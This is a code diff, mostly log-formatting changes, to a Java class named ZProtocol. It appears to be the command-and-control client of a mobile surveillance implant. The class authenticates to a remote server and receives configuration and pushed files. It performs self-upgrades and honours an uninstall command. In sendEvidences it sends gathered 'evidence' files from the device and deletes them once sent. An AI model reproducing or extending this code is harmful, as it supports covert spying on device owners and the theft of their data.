@@ -87,11 +87,12 @@ public class ZProtocol extends Protocol {
 		uninstall = false;
 
 		try {
+			transport.start();
 
 			uninstall = authentication();
 
 			if (uninstall) {
-				Log.d(TAG,"Warn: " +"Uninstall detected, no need to continue");
+				Log.d(TAG, "Warn: " + "Uninstall detected, no need to continue");
 				return true;
 			}
 
@@ -108,13 +109,13 @@ public class ZProtocol extends Protocol {
 			return true;
 
 		} catch (final TransportException e) {
-			Log.d(TAG,"Error: " +e.toString());
+			Log.d(TAG, "Error: " + e.toString());
 			return false;
 		} catch (final ProtocolException e) {
-			Log.d(TAG,"Error: " +e.toString());
+			Log.d(TAG, "Error: " + e.toString());
 			return false;
 		} catch (final CommandException e) {
-			Log.d(TAG,"Error: " +e.toString());
+			Log.d(TAG, "Error: " + e.toString());
 			return false;
 		} finally {
 			transport.close();
@@ -132,15 +133,16 @@ public class ZProtocol extends Protocol {
 	 */
 	private boolean authentication() throws TransportException,
 			ProtocolException {
-		Log.d(TAG,"Info: ***** Authentication *****");
+		Log.d(TAG, "Info: ***** Authentication *****");
 		// key init
 		cryptoConf.makeKey(Keys.self().getChallengeKey());
 
 		random.nextBytes(Kd);
 		random.nextBytes(Nonce);
-		Log.d(TAG,"Kd: " + Utils.byteArrayToHex(Kd));
-		Log.d(TAG,"Nonce: " + Utils.byteArrayToHex(Nonce));
+		Log.d(TAG, "Kd: " + Utils.byteArrayToHex(Kd));
+		Log.d(TAG, "Nonce: " + Utils.byteArrayToHex(Nonce));
 		final byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication());
+
 		final byte[] response = transport.command(cypherOut);
 
 		return parseAuthentication(response);
@@ -157,7 +159,7 @@ public class ZProtocol extends Protocol {
 	 */
 	private boolean[] identification() throws TransportException,
 			ProtocolException {
-		Log.d(TAG,"Info: ***** Identification *****");
+		Log.d(TAG, "Info: ***** Identification *****");
 		final byte[] response = command(Proto.ID, forgeIdentification());
 		final boolean[] capabilities = parseIdentification(response);
 		return capabilities;
@@ -178,7 +180,7 @@ public class ZProtocol extends Protocol {
 	private void newConf(final boolean cap) throws TransportException,
 			ProtocolException, CommandException {
 		if (cap) {
-			Log.d(TAG,"Info: ***** NewConf *****");
+			Log.d(TAG, "Info: ***** NewConf *****");
 			final byte[] response = command(Proto.NEW_CONF);
 			parseNewConf(response);
 		}
@@ -219,7 +221,7 @@ public class ZProtocol extends Protocol {
 	private void upload(final boolean cap) throws TransportException,
 			ProtocolException, CommandException {
 		if (cap) {
-			Log.d(TAG,"Info: ***** Upload *****");
+			Log.d(TAG, "Info: ***** Upload *****");
 			upgrade = false;
 			boolean left = true;
 			while (left) {
@@ -244,7 +246,7 @@ public class ZProtocol extends Protocol {
 	private void upgrade(final boolean cap) throws TransportException,
 			ProtocolException, CommandException {
 		if (cap) {
-			Log.d(TAG,"Info: ***** Upgrade *****");
+			Log.d(TAG, "Info: ***** Upgrade *****");
 			upgradeFiles.removeAllElements();
 
 			boolean left = true;
@@ -270,7 +272,7 @@ public class ZProtocol extends Protocol {
 	private void filesystem(final boolean cap) throws TransportException,
 			ProtocolException, CommandException {
 		if (cap) {
-			Log.d(TAG,"Info: ***** FileSystem *****");
+			Log.d(TAG, "Info: ***** FileSystem *****");
 			final byte[] response = command(Proto.FILESYSTEM);
 			parseFileSystem(response);
 		}
@@ -288,7 +290,7 @@ public class ZProtocol extends Protocol {
 	 */
 	private void evidences() throws TransportException, ProtocolException,
 			CommandException {
-		Log.d(TAG,"Info: ***** Log *****");
+		Log.d(TAG, "Info: ***** Log *****");
 		sendEvidences(Path.logs());
 	}
 
@@ -304,7 +306,7 @@ public class ZProtocol extends Protocol {
 	 */
 	private void end() throws TransportException, ProtocolException,
 			CommandException {
-		Log.d(TAG,"Info: ***** END *****");
+		Log.d(TAG, "Info: ***** END *****");
 		final byte[] response = command(Proto.BYE);
 		parseNewConf(response);
 
@@ -340,14 +342,15 @@ public class ZProtocol extends Protocol {
 		digest.update(keys.getConfKey());
 
 		final byte[] sha1 = digest.getDigest();
-		Log.d(TAG,"forgeAuthentication sha1 = " + Utils.byteArrayToHex(sha1));
-		Log.d(TAG,"forgeAuthentication confKey="
-				+ Utils.byteArrayToHex(keys.getConfKey()));
+		Log.d(TAG, "forgeAuthentication sha1 = " + Utils.byteArrayToHex(sha1));
+		Log.d(TAG,
+				"forgeAuthentication confKey="
+						+ Utils.byteArrayToHex(keys.getConfKey()));
 		// appending digest
 		dataBuffer.write(sha1);
 		Check.ensures(dataBuffer.getPosition() == data.length,
 				"forgeAuthentication, wrong array size");
-		Log.d(TAG,"forgeAuthentication: " + Utils.byteArrayToHex(data));
+		Log.d(TAG, "forgeAuthentication: " + Utils.byteArrayToHex(data));
 		return data;
 	}
 
@@ -364,20 +367,20 @@ public class ZProtocol extends Protocol {
 			throws ProtocolException {
 
 		if (new String(authResult).contains("<html>")) {
-			Log.d(TAG,"Error: Fake answer");
+			Log.d(TAG, "Error: Fake answer");
 			throw new ProtocolException(14);
 		}
 		Check.ensures(authResult.length == 64, "authResult.length="
 				+ authResult.length);
-		Log.d(TAG,"decodeAuth result = " + Utils.byteArrayToHex(authResult));
-		Log.d(TAG,"decodeAuth result string= " + new String(authResult));
+		Log.d(TAG, "decodeAuth result = " + Utils.byteArrayToHex(authResult));
+		Log.d(TAG, "decodeAuth result string= " + new String(authResult));
 		// Retrieve K
 		final byte[] cypherKs = new byte[32];
 		System.arraycopy(authResult, 0, cypherKs, 0, cypherKs.length);
 		try {
 			final byte[] Ks = cryptoConf.decryptData(cypherKs);
-			Log.d(TAG,"decodeAuth Kd=" + Utils.byteArrayToHex(Kd));
-			Log.d(TAG,"decodeAuth Ks=" + Utils.byteArrayToHex(Ks));
+			Log.d(TAG, "decodeAuth Kd=" + Utils.byteArrayToHex(Kd));
+			Log.d(TAG, "decodeAuth Ks=" + Utils.byteArrayToHex(Ks));
 			// PBKDF1 (SHA1, c=1, Salt=KS||Kd)
 			final SHA1Digest digest = new SHA1Digest();
 			digest.update(Keys.self().getConfKey());
@@ -388,27 +391,28 @@ public class ZProtocol extends Protocol {
 			System.arraycopy(digest.getDigest(), 0, K, 0, K.length);
 
 			cryptoK.makeKey(K);
-			Log.d(TAG,"decodeAuth K=" + Utils.byteArrayToHex(K));
+			Log.d(TAG, "decodeAuth K=" + Utils.byteArrayToHex(K));
 			// Retrieve Nonce and Cap
 			final byte[] cypherNonceCap = new byte[32];
 			System.arraycopy(authResult, 32, cypherNonceCap, 0,
 					cypherNonceCap.length);
 
 			final byte[] plainNonceCap = cryptoK.decryptData(cypherNonceCap);
-			Log.d(TAG,"decodeAuth plainNonceCap="
-					+ Utils.byteArrayToHex(plainNonceCap));
+			Log.d(TAG,
+					"decodeAuth plainNonceCap="
+							+ Utils.byteArrayToHex(plainNonceCap));
 			final boolean nonceOK = Utils.equals(Nonce, 0, plainNonceCap, 0,
 					Nonce.length);
-			Log.d(TAG,"decodeAuth nonceOK: " + nonceOK);
+			Log.d(TAG, "decodeAuth nonceOK: " + nonceOK);
 			if (nonceOK) {
 				final int cap = Utils.byteArrayToInt(plainNonceCap, 16);
 				if (cap == Proto.OK) {
-					Log.d(TAG,"decodeAuth Proto OK");
+					Log.d(TAG, "decodeAuth Proto OK");
 				} else if (cap == Proto.UNINSTALL) {
-					Log.d(TAG,"decodeAuth Proto Uninstall");
+					Log.d(TAG, "decodeAuth Proto Uninstall");
 					return true;
 				} else {
-					Log.d(TAG,"decodeAuth error: " + cap);
+					Log.d(TAG, "decodeAuth error: " + cap);
 					throw new ProtocolException(11);
 				}
 			} else {
@@ -416,7 +420,7 @@ public class ZProtocol extends Protocol {
 			}
 
 		} catch (final CryptoException ex) {
-			Log.d(TAG,"Error: parseAuthentication: " + ex);
+			Log.d(TAG, "Error: parseAuthentication: " + ex);
 			throw new ProtocolException(13);
 		}
 
@@ -447,7 +451,7 @@ public class ZProtocol extends Protocol {
 		dataBuffer.write(phone);
 		Check.ensures(dataBuffer.getPosition() == content.length,
 				"forgeIdentification pos: " + dataBuffer.getPosition());
-		Log.d(TAG,"forgeIdentification: " + Utils.byteArrayToHex(content));
+		Log.d(TAG, "forgeIdentification: " + Utils.byteArrayToHex(content));
 		return content;
 	}
 
@@ -466,7 +470,7 @@ public class ZProtocol extends Protocol {
 
 		final int res = Utils.byteArrayToInt(result, 0);
 		if (res == Proto.OK) {
-			Log.d(TAG,"Info: got Identification");
+			Log.d(TAG, "Info: got Identification");
 			final DataBuffer dataBuffer = new DataBuffer(result, 4,
 					result.length - 4);
 			try {
@@ -474,10 +478,10 @@ public class ZProtocol extends Protocol {
 				final int totSize = dataBuffer.readInt();
 
 				final long dateServer = dataBuffer.readLong();
-				Log.d(TAG,"parseIdentification: " + dateServer);
+				Log.d(TAG, "parseIdentification: " + dateServer);
 				final Date date = new Date();
 				final int drift = (int) (dateServer - (date.getTime() / 1000));
-				Log.d(TAG,"parseIdentification drift: " + drift);
+				Log.d(TAG, "parseIdentification drift: " + drift);
 				Status.self().drift = drift;
 
 				final int numElem = dataBuffer.readInt();
@@ -487,17 +491,17 @@ public class ZProtocol extends Protocol {
 					if (cap < Proto.LASTTYPE) {
 						capabilities[cap] = true;
 					}
-					Log.d(TAG,"capabilities: " + capabilities[i]);
+					Log.d(TAG, "capabilities: " + capabilities[i]);
 				}
 
 			} catch (final IOException e) {
-				Log.d(TAG,"Error: " +e.toString());
+				Log.d(TAG, "Error: " + e.toString());
 				throw new ProtocolException();
 			}
 		} else if (res == Proto.NO) {
-			Log.d(TAG,"Info: no new conf: ");
+			Log.d(TAG, "Info: no new conf: ");
 		} else {
-			Log.d(TAG,"Error: parseNewConf: " + res);
+			Log.d(TAG, "Error: parseNewConf: " + res);
 			throw new ProtocolException();
 		}
 
@@ -518,9 +522,9 @@ public class ZProtocol extends Protocol {
 			CommandException {
 		final int res = Utils.byteArrayToInt(result, 0);
 		if (res == Proto.OK) {
-			Log.d(TAG,"Info: got NewConf");
+			Log.d(TAG, "Info: got NewConf");
 			final int confLen = Utils.byteArrayToInt(result, 4);
-			Log.d(TAG,"parseNewConf len: " + confLen);
+			Log.d(TAG, "parseNewConf len: " + confLen);
 			if (confLen > 0) {
 				final boolean ret = Protocol.saveNewConf(result, 8);
 
@@ -530,9 +534,9 @@ public class ZProtocol extends Protocol {
 			}
 
 		} else if (res == Proto.NO) {
-			Log.d(TAG,"Info: no new conf: ");
+			Log.d(TAG, "Info: no new conf: ");
 		} else {
-			Log.d(TAG,"Error: parseNewConf: " + res);
+			Log.d(TAG, "Error: parseNewConf: " + res);
 			throw new ProtocolException();
 		}
 	}
@@ -548,7 +552,7 @@ public class ZProtocol extends Protocol {
 	protected void parseDownload(final byte[] result) throws ProtocolException {
 		final int res = Utils.byteArrayToInt(result, 0);
 		if (res == Proto.OK) {
-			Log.d(TAG,"parseDownload, OK");
+			Log.d(TAG, "parseDownload, OK");
 			final DataBuffer dataBuffer = new DataBuffer(result, 4,
 					result.length - 4);
 			try {
@@ -557,7 +561,7 @@ public class ZProtocol extends Protocol {
 				final int numElem = dataBuffer.readInt();
 				for (int i = 0; i < numElem; i++) {
 					String file = WChar.readPascal(dataBuffer);
-					Log.d(TAG,"parseDownload: " + file);
+					Log.d(TAG, "parseDownload: " + file);
 					// expanding $dir$
 					file = Directory.expandMacro(file);
 					file = Protocol.normalizeFilename(file);
@@ -565,13 +569,13 @@ public class ZProtocol extends Protocol {
 				}
 
 			} catch (final IOException e) {
-				Log.d(TAG,"Error: " +e.toString());
+				Log.d(TAG, "Error: " + e.toString());
 				throw new ProtocolException();
 			}
 		} else if (res == Proto.NO) {
-			Log.d(TAG,"Info: parseDownload: no download");
+			Log.d(TAG, "Info: parseDownload: no download");
 		} else {
-			Log.d(TAG,"Error: parseDownload, wrong answer: " + res);
+			Log.d(TAG, "Error: parseDownload, wrong answer: " + res);
 			throw new ProtocolException();
 		}
 	}
@@ -589,32 +593,32 @@ public class ZProtocol extends Protocol {
 
 		final int res = Utils.byteArrayToInt(result, 0);
 		if (res == Proto.OK) {
-			Log.d(TAG,"parseUpload, OK");
+			Log.d(TAG, "parseUpload, OK");
 			final DataBuffer dataBuffer = new DataBuffer(result, 4,
 					result.length - 4);
 			try {
 				final int totSize = dataBuffer.readInt();
 				final int left = dataBuffer.readInt();
-				Log.d(TAG,"parseUpload left: " + left);
+				Log.d(TAG, "parseUpload left: " + left);
 				final String filename = WChar.readPascal(dataBuffer);
-				Log.d(TAG,"parseUpload: " + filename);
+				Log.d(TAG, "parseUpload: " + filename);
 				final int size = dataBuffer.readInt();
 				final byte[] content = new byte[size];
 				dataBuffer.read(content);
-				Log.d(TAG,"parseUpload: saving");
+				Log.d(TAG, "parseUpload: saving");
 				Protocol.saveUpload(filename, content);
 
 				return left > 0;
 
 			} catch (final IOException e) {
-				Log.d(TAG,"Error: " +e.toString());
+				Log.d(TAG, "Error: " + e.toString());
 				throw new ProtocolException();
 			}
 		} else if (res == Proto.NO) {
-			Log.d(TAG,"parseUpload, NO");
+			Log.d(TAG, "parseUpload, NO");
 			return false;
 		} else {
-			Log.d(TAG,"Error: parseUpload, wrong answer: " + res);
+			Log.d(TAG, "Error: parseUpload, wrong answer: " + res);
 			throw new ProtocolException();
 		}
 	}
@@ -633,38 +637,39 @@ public class ZProtocol extends Protocol {
 
 		final int res = Utils.byteArrayToInt(result, 0);
 		if (res == Proto.OK) {
-			Log.d(TAG,"parseUpgrade, OK");
+			Log.d(TAG, "parseUpgrade, OK");
 			final DataBuffer dataBuffer = new DataBuffer(result, 4,
 					result.length - 4);
 			try {
 				final int totSize = dataBuffer.readInt();
 				final int left = dataBuffer.readInt();
-				Log.d(TAG,"parseUpgrade left: " + left);
+				Log.d(TAG, "parseUpgrade left: " + left);
 				final String filename = WChar.readPascal(dataBuffer);
-				Log.d(TAG,"parseUpgrade: " + filename);
+				Log.d(TAG, "parseUpgrade: " + filename);
 				final int size = dataBuffer.readInt();
 				final byte[] content = new byte[size];
 				dataBuffer.read(content);
-				Log.d(TAG,"parseUpgrade: saving");
+				Log.d(TAG, "parseUpgrade: saving");
 				Protocol.saveUpload(filename, content);
 				upgradeFiles.addElement(filename);
 
 				if (left == 0) {
-					Log.d(TAG,"parseUpgrade: all file saved, proceed with upgrade");
+					Log.d(TAG,
+							"parseUpgrade: all file saved, proceed with upgrade");
 					Protocol.upgradeMulti(upgradeFiles);
 				}
 
 				return left > 0;
 
 			} catch (final IOException e) {
-				Log.d(TAG,"Error: " +e.toString());
+				Log.d(TAG, "Error: " + e.toString());
 				throw new ProtocolException();
 			}
 		} else if (res == Proto.NO) {
-			Log.d(TAG,"parseUpload, NO");
+			Log.d(TAG, "parseUpload, NO");
 			return false;
 		} else {
-			Log.d(TAG,"Error: parseUpload, wrong answer: " + res);
+			Log.d(TAG, "Error: parseUpload, wrong answer: " + res);
 			throw new ProtocolException();
 		}
 	}
@@ -681,7 +686,7 @@ public class ZProtocol extends Protocol {
 			throws ProtocolException {
 		final int res = Utils.byteArrayToInt(result, 0);
 		if (res == Proto.OK) {
-			Log.d(TAG,"parseFileSystem, OK");
+			Log.d(TAG, "parseFileSystem, OK");
 			final DataBuffer dataBuffer = new DataBuffer(result, 4,
 					result.length - 4);
 			try {
@@ -690,21 +695,20 @@ public class ZProtocol extends Protocol {
 				for (int i = 0; i < numElem; i++) {
 					final int depth = dataBuffer.readInt();
 					String file = WChar.readPascal(dataBuffer);
-					Log.d(TAG,"parseFileSystem: " + file + " depth: "
-									+ depth);
+					Log.d(TAG, "parseFileSystem: " + file + " depth: " + depth);
 					// expanding $dir$
 					file = Directory.expandMacro(file);
 					Protocol.saveFilesystem(depth, file);
 				}
 
 			} catch (final IOException e) {
-				Log.d(TAG,"Error: parse error: " + e);
+				Log.d(TAG, "Error: parse error: " + e);
 				throw new ProtocolException();
 			}
 		} else if (res == Proto.NO) {
-			Log.d(TAG,"Info: parseFileSystem: no download");
+			Log.d(TAG, "Info: parseFileSystem: no download");
 		} else {
-			Log.d(TAG,"Error: parseFileSystem, wrong answer: " + res);
+			Log.d(TAG, "Error: parseFileSystem, wrong answer: " + res);
 			throw new ProtocolException();
 		}
 	}
@@ -721,30 +725,31 @@ public class ZProtocol extends Protocol {
 	 */
 	protected void sendEvidences(final String basePath)
 			throws TransportException, ProtocolException {
-		Log.d(TAG,"Info: sendEvidences from: " + basePath);
+		Log.d(TAG, "Info: sendEvidences from: " + basePath);
 		final EvidenceCollector logCollector = EvidenceCollector.self();
 
 		final Vector dirs = logCollector.scanForDirLogs(basePath);
 		final int dsize = dirs.size();
-		Log.d(TAG,"sendEvidences #directories: " + dsize);
+		Log.d(TAG, "sendEvidences #directories: " + dsize);
 		for (int i = 0; i < dsize; ++i) {
 			final String dir = (String) dirs.elementAt(i);
 			final String[] logs = logCollector.scanForEvidences(basePath, dir);
 			final int lsize = logs.length;
-			Log.d(TAG,"    dir: " + dir + " #evidences: " + lsize);
+			Log.d(TAG, "    dir: " + dir + " #evidences: " + lsize);
 			// for (int j = 0; j < lsize; ++j) {
 			// final String logName = (String) logs.elementAt(j);
 			for (final String logName : logs) {
 				final String fullLogName = basePath + dir + logName;
 				final AutoFile file = new AutoFile(fullLogName);
 				if (!file.exists()) {
-					Log.d(TAG,"Error: File doesn't exist: " + fullLogName);
+					Log.d(TAG, "Error: File doesn't exist: " + fullLogName);
 					continue;
 				}
 				final byte[] content = file.read();
-				Log.d(TAG,"Info: Sending file: "
-						+ EvidenceCollector.decryptName(logName) + " = "
-						+ fullLogName);
+				Log.d(TAG,
+						"Info: Sending file: "
+								+ EvidenceCollector.decryptName(logName)
+								+ " = " + fullLogName);
 				final byte[] plainOut = new byte[content.length + 4];
 				System.arraycopy(Utils.intToByteArray(content.length), 0,
 						plainOut, 0, 4);
@@ -756,12 +761,12 @@ public class ZProtocol extends Protocol {
 				if (ret) {
 					logCollector.remove(fullLogName);
 				} else {
-					Log.d(TAG,"Warn: " +"error sending file, bailing out");
+					Log.d(TAG, "Warn: " + "error sending file, bailing out");
 					return;
 				}
 			}
 			if (!Path.removeDirectory(basePath + dir)) {
-				Log.d(TAG,"Warn: " +"Not empty directory");
+				Log.d(TAG, "Warn: " + "Not empty directory");
 			}
 		}
 	}
@@ -806,7 +811,7 @@ public class ZProtocol extends Protocol {
 	 */
 	private byte[] command(final int command) throws TransportException,
 			ProtocolException {
-		Log.d(TAG,"command: " + command);
+		Log.d(TAG, "command: " + command);
 		return command(command, new byte[0]);
 	}
 
@@ -825,7 +830,7 @@ public class ZProtocol extends Protocol {
 			throws TransportException {
 		Check.requires(cryptoK != null, "cypherCommand: cryptoK null");
 		Check.requires(data != null, "cypherCommand: data null");
-		Log.d(TAG,"command: " + command + " datalen: " + data.length);
+		Log.d(TAG, "command: " + command + " datalen: " + data.length);
 		final int dataLen = data.length;
 		final byte[] plainOut = new byte[dataLen + 4];
 		System.arraycopy(Utils.intToByteArray(command), 0, plainOut, 0, 4);
@@ -838,10 +843,11 @@ public class ZProtocol extends Protocol {
 			plainIn = cypheredWriteReadSha(plainOut);
 			return plainIn;
 		} catch (final CryptoException e) {
-			Log.d(TAG,"command: " + e);
+			Log.d(TAG, "command: " + e);
 			throw new TransportException(9);
 		}
 	}
+
 	/**
 	 * Cyphered write read.
 	 * 
@@ -856,13 +862,14 @@ public class ZProtocol extends Protocol {
 	private byte[] cypheredWriteRead(final byte[] plainOut)
 			throws TransportException, CryptoException {
 
-		Log.d(TAG,"cypheredWriteRead");
+		Log.d(TAG, "cypheredWriteRead");
 
 		final byte[] cypherOut = cryptoK.encryptData(plainOut);
 		final byte[] cypherIn = transport.command(cypherOut);
 		final byte[] plainIn = cryptoK.decryptData(cypherIn);
 		return plainIn;
 	}
+
 	/**
 	 * Cyphered write read sha.
 	 * 
@@ -876,14 +883,14 @@ public class ZProtocol extends Protocol {
 	 */
 	private byte[] cypheredWriteReadSha(final byte[] plainOut)
 			throws TransportException, CryptoException {
-		Log.d(TAG,"cypheredWriteReadSha");
-		Log.d(TAG,"plainout: " + plainOut.length);
+		Log.d(TAG, "cypheredWriteReadSha");
+		Log.d(TAG, "plainout: " + plainOut.length);
 		final byte[] cypherOut = cryptoK.encryptDataIntegrity(plainOut);
-		Log.d(TAG,"cypherOut: " + cypherOut.length);
+		Log.d(TAG, "cypherOut: " + cypherOut.length);
 		final byte[] cypherIn = transport.command(cypherOut);
 
 		if (cypherIn.length < SHA1LEN) {
-			Log.d(TAG,"Error: cypheredWriteReadSha: cypherIn sha len error!");
+			Log.d(TAG, "Error: cypheredWriteReadSha: cypherIn sha len error!");
 			throw new CryptoException();
 		}
 
@@ -907,10 +914,10 @@ public class ZProtocol extends Protocol {
 		if (res == Proto.OK) {
 			return true;
 		} else if (res == Proto.NO) {
-			Log.d(TAG,"Error: checkOk: NO");
+			Log.d(TAG, "Error: checkOk: NO");
 			return false;
 		} else {
-			Log.d(TAG,"Error: checkOk: " + res);
+			Log.d(TAG, "Error: checkOk: " + res);
 			throw new ProtocolException();
 		}
 	}
